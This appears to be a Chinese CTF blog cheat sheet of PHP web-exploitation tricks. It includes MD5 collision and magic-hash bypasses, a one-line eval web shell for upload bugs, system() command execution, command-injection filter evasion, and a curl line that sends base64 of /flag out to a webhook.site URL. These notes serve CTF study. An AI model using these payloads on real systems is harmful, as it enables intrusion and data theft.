---
title: web简单利用
date: 2024-09-18 19:54:55
categories: CTF
tags: web
updated: 2024-09-18 19:54:55
---
最近写一些垃圾web用到了不知道的知识，在此记录，首先是头文件绕过

> X-Forwarded-For : 简称XFF头，它代表客户端，也就是HTTP的 请求端真实的IP ，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项

可以实现对web对本地的访问达到网址绕过的效果

#### md5绕过
##### 相同的md5字符串
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2

Param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2

Param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2

$data1="\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70";
$data2="\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70";
##### php弱类型绕过
>MMHUWUV 0e701732711630150438129209816536
MAUXXQC 0e478478466848439040434801845361
IHKFRNS 0e256160682445802696926137988570
GZECLQZ 0e537612333747236407713628225676
GGHMVOE 0e362766013028313274586933780773
GEGHBXL 0e248776895502908863709684713578
EEIZDOI 0e782601363539291779881938479162
DYAXWCA 0e424759758842488633464374063001
##### php强类型比较
>===会连同数据类型一起比较，同时一些解析也被限制了。我们可以使用数组进行绕过。数组绕过是指我们传值的时候传一个数组上去，比如?id[]=1,这个就是使用GET方法传值时候的操作。当md5函数遇到数组之后会返回空值，因为它无法加密数组，于是可以绕过php强类型比较。
#### php文件上传漏洞
一句话木马
```php
<?php eval($_POST[0]);?>
```
这个木马接受 POST 参数中0的值作为值, 我们可以使用蚁剑连接这个木马(密码为 0)
上传成功后会返回后端的判断代码, 此时可以知道我们上传的路径为 uploads且文件名不变

我们可以通过蚁剑进行连接

#### php代码执行
[相关文档](https://www.php.net/manual/zh/function.eval.php)  
我们可以利用 system 函数执行 Shell 命令,   
也可用使用 echo file_get_contents('/flag'); 来输出flag内容  

下面给出 system 的示例
>DT=system('cat /flag');  
注意用;来分隔，因为此时已经是一个php语句了

解释:  
system('cat /flag')：system() 函数用于执行系统命令。在这个例子中，system() 函数执行的是 cat /flag，它会尝试读取系统中路径为 /flag 的文件内容并输出到终端

>DT=phpinfo();检查版本信息查漏洞

#### 反序列化
在看了半个小时后终于懂了一点，反序列化就是利用已经存在的函数之间的调用，以及特殊方法绕过对应的检查后利用序列化函数生成一个可以在后面执行并获取代码的漏洞

POP chain
魔术方法：
>__construct()		   //对象创建(new)时会自动调用。  
__wakeup() 		       //使用unserialize时触发  
__sleep() 		       //使用serialize时触发  
__destruct() 	       //对象被销毁时触发  
__call() 		       //在对象上下文中调用不可访问的方法时触发  
__callStatic() 	       //在静态上下文中调用不可访问的方法时触发  
__get() 		       //用于从不可访问的属性读取数据 包括private或者是不存在的  
__set() 		       //用于将数据写入不可访问的属性  
__isset() 		       //在不可访问的属性上调用isset()或empty()触发  
__unset()  		       //在不可访问的属性上使用unset()时触发  
__toString() 		   //把类当作字符串使用时触发  
__invoke()             //当脚本尝试将对象调用为函数时触发  就是加了括号  
__autoload()           //在代码中当调用不存在的类时会自动调用该方法。  
的序列化字符串在反序列化对象时与真实存在的参数个数不同时会跳过执行，即当前函数中只有一个参数$flag，若传入的序列化字符串中的参数个数为2即可绕过

#### RCE过滤
##### Windows系统支持的管道符如下：
1. “|”：直接执行后面的语句。
2. “||”：如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。
3. “&”：两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。
4. “&&”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。

##### Linux系统支持的管道符如下：
1. “;”：执行完前面的语句再执行后面的语句。
2. “|”：显示后面语句的执行结果。
3. “||”：当前面的语句执行出错时，执行后面的语句。
4. “&”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。
5. “&&”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。

##### 输出重定向
![](https://gitee.com/fogpost/photo/raw/master/202409231119238.png)

##### 过滤
[参考](https://blog.csdn.net/Manuffer/article/details/120672448)
- cat 
>cat\tac\more\less\head\tail\nl\tailf
>单引号 c''at  
>双引号 c""at  
>shell特殊变量 ca$@t
- 空格
>< 、<>、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等 %0a(url编码)   
>$IFS在linux下表示分隔符，但是如果单纯的cat$IFS2，bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，因此这里加一个{}就固定了变量名。    
>同理，在后面加个$可以起到截断的作用，使用$9是因为它是当前系统shell进程的第九个参数的持有者，它始终为空字符串

#### 无回显命令执行
##### 重定向到文件
>cmd_here > 1.txt
然后利用wegt命令进行文件下载
##### curl外带
可以利用webhook.site建立网络端口监听，
然后执行
cmd=curl https://webhook.site/2c5bcc35-bc12-4910-bae5-e51fbadac519/`cat /flag | base64`
来实现base64编码获取
##### 反弹shell